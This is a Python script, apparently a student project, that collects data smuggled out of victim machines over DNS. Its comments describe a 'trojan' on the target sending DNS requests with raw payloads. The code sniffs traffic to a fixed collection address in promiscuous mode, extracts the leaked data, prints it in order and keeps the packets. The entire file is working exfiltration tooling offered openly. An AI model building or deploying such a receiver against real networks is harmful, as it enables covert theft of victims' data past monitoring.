"""
this file contains the implementation for our `searcher` sniffer.

when target runs our script, it should send a DNS request with data. the sniffer is searches for that,
and prints the data in correct order.

:authors: Lior Vinman & Yoad Tamar

:since: 11/06/2023
"""
import sys

import scapy.all as scapy


# buffer that will hold the tunnelled dns (scapy) packets
data_tunneling = []


def process_pkt(pkt: scapy.packet.Packet) -> None:
    """
    this function is the callback function over the sniffing.

    it seeks for our packets, which build: `ip / udp / dns / raw`,
    specifically searching for `dns / raw` because regular DNS request doesn't contain raw header.

    :param pkt: packet captured
    """

    # if packet both has DNS & Payload we know its data leaking from our trojan
    if pkt.haslayer(scapy.DNS) and pkt.haslayer(scapy.Raw):

        # getting the data
        payload = pkt[scapy.Raw].load.decode()

        # if data is "None" so it's just a seperator packet
        if payload == "None":
            print()
            return

        # else, printing the data in correct order
        print(payload, end="")

        # saving packet into our buffer
        data_tunneling.append(pkt)


def main():

    try:

        # stating to sniff
        scapy.sniff(prn=process_pkt, store=False, filter="dst host 1.2.3.4", promisc=True)

    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()
